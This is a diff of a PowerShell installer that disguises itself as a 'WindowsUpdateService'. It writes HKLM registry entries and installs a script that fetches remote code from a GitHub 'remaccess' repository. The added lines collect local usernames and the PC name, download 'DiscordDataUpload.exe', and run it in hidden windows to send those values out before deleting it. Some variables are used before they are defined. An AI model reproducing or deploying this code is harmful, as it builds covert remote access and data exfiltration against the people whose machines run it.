@@ -1,12 +1,21 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
+$userNames = ($userProfiles | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join "|"
 $code = Read-Host "Enter the code"
+$name = Read-Host "Type in the Name of the PC"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
-#Install Registry Entry
+$exePath = Join-Path $exeFolder "DiscordDataUpload.exe"
+$userProfiles = Get-WmiObject -Class Win32_UserProfile | Where-Object { $_.Special -eq $false }
+$messageboturl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 if (-not (Test-Path $regPath)) {
     New-Item -Path $regPath -Force
 }
 Set-ItemProperty -Path $regPath -Name "Code" -Value $code
 Set-ItemProperty -Path $regPath -Name "Data" -Value active
+$homeDirectory = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+$exeFolder = Join-Path $homeDirectory "DiscordDataUpload"
+if (-not (Test-Path $exeFolder)) {
+    New-Item -Path $exeFolder -ItemType Directory
+}
 #Install WindowsUpdateService
 $scriptContent = @'
 $url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
@@ -111,6 +120,14 @@ if (Get-ScheduledTask -TaskName $daemonserv -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $daemonserv -Confirm:$false
     Write-Host "Task '$daemonserv' deleted."
 } else {}
+#DataUpload
+Invoke-WebRequest -Uri $messageboturl -OutFile $exePath
+Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $code
+Start-Sleep 2
+Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $name
+Start-Sleep 2
+Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $userNames
+ Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
 # Removal of directories
 $ps1Files = @("C:\Windows\WindowsUpdateService.ps1", "C:\Windows\WindowsUpdateServiceDaemon.ps1")
 foreach ($file in $ps1Files) {
@@ -121,3 +138,4 @@ foreach ($file in $ps1Files) {
         Write-Host "File $file does not exist."
     }
 }
+
